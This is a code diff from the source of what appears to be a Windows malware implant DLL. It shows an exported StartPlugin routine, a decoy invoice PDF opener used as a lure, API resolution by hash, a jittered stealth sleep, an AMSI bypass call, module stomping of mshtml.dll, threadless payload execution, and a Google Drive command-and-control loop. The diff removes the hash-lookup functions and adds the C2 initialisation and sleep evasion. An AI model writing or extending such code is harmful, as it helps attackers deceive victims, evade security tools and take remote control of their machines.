@@ -34,31 +34,6 @@ typedef struct _API_TABLE {
 
 static API_TABLE g_ApiTable = {0};
 
-static PVOID GetModuleBaseByHash(uint32_t hash) {
-    PPEB peb = (PPEB)__readgsqword(0x60);
-    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
-    PLIST_ENTRY current = head->Flink;
-    while (current != head) {
-        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
-        if (HashStringDjb2W(entry->BaseDllName.Buffer) == hash) return entry->DllBase;
-        current = current->Flink;
-    }
-    return NULL;
-}
-
-static PVOID ResolveApiByHash(PVOID moduleBase, uint32_t hash) {
-    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)moduleBase;
-    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)moduleBase + pDos->e_lfanew);
-    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)moduleBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-    PDWORD pNames = (PDWORD)((PBYTE)moduleBase + pExport->AddressOfNames);
-    PDWORD pFuncs = (PDWORD)((PBYTE)moduleBase + pExport->AddressOfFunctions);
-    PWORD pOrds = (PWORD)((PBYTE)moduleBase + pExport->AddressOfNameOrdinals);
-    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
-        if (HashStringDjb2A((LPCSTR)((PBYTE)moduleBase + pNames[i])) == hash) return (PVOID)((PBYTE)moduleBase + pFuncs[pOrds[i]]);
-    }
-    return NULL;
-}
-
 static void InitializeApiTable() {
     PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
     PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
@@ -73,10 +48,25 @@ static void InitializeApiTable() {
     g_ApiTable.SetWaitableTimer = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_SetWaitableTimer);
     g_ApiTable.GetSystemInfo = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_GetSystemInfo);
     g_ApiTable.GetModuleFileNameW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_GetModuleFileNameW);
+
+    InitGDriveApi();
 }
 
 static void OpenDecoyDocument() {
     ShellExecuteW(NULL, L"open", L"Factura_Real.pdf", NULL, NULL, SW_SHOWNORMAL);
+}
+
+static void StealthSleep(DWORD dwBaseMS) {
+    srand((unsigned int)time(NULL));
+    float jitter = (float)(rand() % (C2_JITTER * 2) - C2_JITTER) / 100.0f;
+    DWORD dwSleepTime = dwBaseMS + (DWORD)(dwBaseMS * jitter);
+    HANDLE hTimer = ((HANDLE(WINAPI *)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR))g_ApiTable.CreateWaitableTimerW)(NULL, FALSE, NULL);
+    if (!hTimer) return;
+    LARGE_INTEGER liDueTime;
+    liDueTime.QuadPart = -(LONGLONG)dwSleepTime * 10000LL;
+    ((BOOL(WINAPI *)(HANDLE, const LARGE_INTEGER*, LONG, PTIMERAPCROUTINE, LPVOID, BOOL))g_ApiTable.SetWaitableTimer)(hTimer, &liDueTime, 0, NULL, NULL, FALSE);
+    WaitForSingleObject(hTimer, INFINITE);
+    CloseHandle(hTimer);
 }
 
 static void ThreadlessExecute(PVOID pPayload) {
@@ -104,10 +94,8 @@ extern "C" __declspec(dllexport) void StartPlugin() {
     g_SyscallGadget = FindSyscallGadget();
     InitializeApiTable();
     BypassAMSI_DataOnly();
-
     PVOID pMem = ModuleStomp(L"mshtml.dll", 0x1000);
     if (pMem) ThreadlessExecute(pMem);
-
     char cmdBuffer[1024];
     while (TRUE) {
         if (GDrive_CheckForCommands(cmdBuffer, sizeof(cmdBuffer))) { }
